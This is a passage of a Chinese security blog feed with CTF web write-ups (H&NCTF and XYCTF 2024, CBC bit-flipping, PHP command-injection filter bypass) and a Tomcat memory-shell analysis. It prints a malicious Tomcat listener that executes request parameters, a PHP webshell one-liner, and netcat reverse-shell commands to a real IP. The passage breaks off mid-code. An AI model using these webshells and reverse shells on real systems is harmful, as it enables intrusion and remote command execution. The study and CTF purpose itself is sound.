get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>考察CBC反转攻击</p><p><a href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a></p><p>贴一个其他师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. 分组 16个字节一组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. 获取原始密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3， 字节翻转</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后就是文件读取+flask pin计算, 偷个懒</p><h2 id="奇怪的网站"><a href="#奇怪的网站" class="headerlink" title="奇怪的网站"></a>奇怪的网站</h2><p>目录扫描可以扫描出来&#x2F;404.php &#x2F;flag.php</p><p>访问网站时有一个302重定向, 这里有提示</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240530001443451.png" alt="image-20240530001443451"></p><p>如果有使用vim的经验的化我们知道vim在异常退出的时候会生成一个隐藏的缓存文件的</p><blockquote><p>第一次产生的缓存文件后缀为.swp，第二次则产生的缓存文件后缀为.swo,第三次产生的缓存文件后缀为.swn, 第四次产生的缓存文件后缀为.swm</p></blockquote><h2 id="GPTS"><a href="#GPTS" class="headerlink" title="GPTS"></a>GPTS</h2><p><a href="https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2+kdurD&alichlgref=https://www.bing.com/">https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDuDAOqf2%2BkdurD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</a></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;H-NCTF-2024-WEB-复现&quot;&gt;&lt;a href=&quot;#H-NCTF-2024-WEB-复现&quot; class=&quot;headerlink&quot; title=&quot;H&amp;amp;NCTF 2024 WEB 复现&quot;&gt;&lt;/a&gt;H&amp;amp;NCTF 2024 WEB 复现&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://example.com/categories/WriteUp/"/>
    
    
    <category term="python内存马" scheme="http://example.com/tags/python%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="CBC翻转攻击" scheme="http://example.com/tags/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    
    <category term="侧信道" scheme="http://example.com/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
    <category term="Flask Pin码计算" scheme="http://example.com/tags/Flask-Pin%E7%A0%81%E8%AE%A1%E7%AE%97/"/>
    
    <category term="ThinkPHP" scheme="http://example.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot学习</title>
    <link href="http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/05/24/SpringBoot%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-05-24T11:20:23.000Z</published>
    <updated>2024-05-24T16:13:09.618Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IDEA创建SpringBoot项目"><a href="#IDEA创建SpringBoot项目" class="headerlink" title="IDEA创建SpringBoot项目"></a>IDEA创建SpringBoot项目</h2><p>选择创建Spring Initializr</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192417970.png" alt="image-20240524192417970"></p><p>勾选Spring web</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524192559708.png" alt="image-20240524192559708"></p><p>此时idea会默认为我们创建一个SpringBoot项目</p><p>由于我们使用是jdk 1.8, 这里会踩坑</p><p>我们需要更改SpringBoot版本为2.x否则会报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193743796.png" alt="image-20240524193743796"></p><p>这里java版本也改成java8</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524193758233.png" alt="image-20240524193758233"></p><p>之后成功运行</p><p>可以看见Tomcat已经启动了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240524194045710.png" alt="image-20240524194045710"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;IDEA创建SpringBoot项目&quot;&gt;&lt;a href=&quot;#IDEA创建SpringBoot项目&quot; class=&quot;headerlink&quot; title=&quot;IDEA创建SpringBoot项目&quot;&gt;&lt;/a&gt;IDEA创建SpringBoot项目&lt;/h2&gt;&lt;p&gt;选择创建Sp</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马分析</title>
    <link href="http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/05/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</id>
    <published>2024-05-21T14:54:52.000Z</published>
    <updated>2024-05-22T14:52:15.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat内存马分析"><a href="#Tomcat内存马分析" class="headerlink" title="Tomcat内存马分析"></a>Tomcat内存马分析</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p><a href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p><p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90">https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90</a></p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>紧接着上一篇Java Web基础篇, 在这里细说Tomcat内存马</p><p>在之前的学习中, 我们已经搭建了tomcat和jsp的调试环境</p><p>参考</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><h3 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><blockquote><p>Servlet是用来处理客户端请求的动态资源，当Tomcat接收到来自客户端的请求时，会将其解析成<code>RequestServlet</code>对象并发送到对应的Servlet上进行处理。</p></blockquote><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><blockquote><p>Filter用于拦截用户请求以及服务端的响应，能够在拦截之后对请求和响应做出相应的修改。Filter不是Servlet，不能直接访问，它能够对于Web应用中的资源（Servlet、JSP、静态页面等）做出拦截，从而实现一些相应的功能。下面是Filter在Server中的调用流程图</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><blockquote><p>Listener是一个实现了特定接口的Java程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p></blockquote><p>三大组件加载顺序</p><ol><li><strong>Listener</strong></li><li><strong>Filter</strong></li><li><strong>Servlet</strong></li></ol><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><h4 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h4><blockquote><p>在Tomcat中的servlet都基本上需要实现这个接口，规定了如果要实现一个WEB容器，他的内容就必须要包含Servletcontext里的内容</p></blockquote><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><blockquote><p>在Tomcat中，ServletContext的实现就是ApplicationContext<br><strong>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</strong></p></blockquote><h4 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h4><blockquote><p>StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。</p></blockquote><h2 id="Listener型内存马"><a href="#Listener型内存马" class="headerlink" title="Listener型内存马"></a>Listener型内存马</h2><p>我们知道最先接收到请求的就是listener组件, 因此我们完全可以在服务器中动态注册一个恶意的listener</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><p>对于ServletRequestListener, 我们访问任意服务器资源是都会触发, 因此用来作内存马再适合不过了</p><p>当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p><p>我们直接在这里创建一个listener</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522000146182.png" alt="image-20240522000146182"></p><p>idea会自动为我们生成基本的框架, 需要重写的方法等</p><p>我们将其修改为恶意的listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;shell_cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时访问任意的路由即可触发任意命令执行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240522001621396.png" alt="image-20240522001621396"></p><p>下面的问题就是如何将恶意的Listener动态注册进服务器了，下面我们来分析一下Listener的创建过程。</p><h3 id="Listener的创建过程"><a href="#Listener的创建过程" class="headerlink" title="Listener的创建过程"></a>Listener的创建过程</h3><p>首先贴出listener的调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">requestInitialized:<span class="number">13</span>, Shell_Listener (Listener)</span><br><span class="line">fireRequestInitEvent:<span class="number">5992</span>, StandardContext (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">121</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat内存马分析&quot;&gt;&lt;a href=&quot;#Tomcat内存马分析&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马分析&quot;&gt;&lt;/a&gt;Tomcat内存马分析&lt;/h1&gt;&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>XYCTF 2024 Web</title>
    <link href="http://example.com/2024/04/28/XYCTF-2024-Web/"/>
    <id>http://example.com/2024/04/28/XYCTF-2024-Web/</id>
    <published>2024-04-28T06:51:55.000Z</published>
    <updated>2024-04-28T06:53:23.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF-2024-Web"><a href="#XYCTF-2024-Web" class="headerlink" title="XYCTF 2024 Web"></a>XYCTF 2024 Web</h1><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>略</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>略</p><h2 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h2><p>相同md5图片, 一搜就有, 略</p><h2 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先要添加一个<code>%0a</code>让代码不被#注释, 然后用<code>%23</code>再把,manba out注释掉</p><p>$(which sh)代替bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23</span><br><span class="line">&amp;1=nc 107.148.75.202 1234 -e $(which sh)</span><br></pre></td></tr></table></figure><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a><strong>ezMake</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php if(eval($$_POST[1])) ?&gt;&#x27; &gt; a.php</span><br></pre></td></tr></table></figure><h2 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a><strong>ez?Make</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 107.148.75.202 1234  -e `which sh`</span><br></pre></td></tr></table></figure><h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 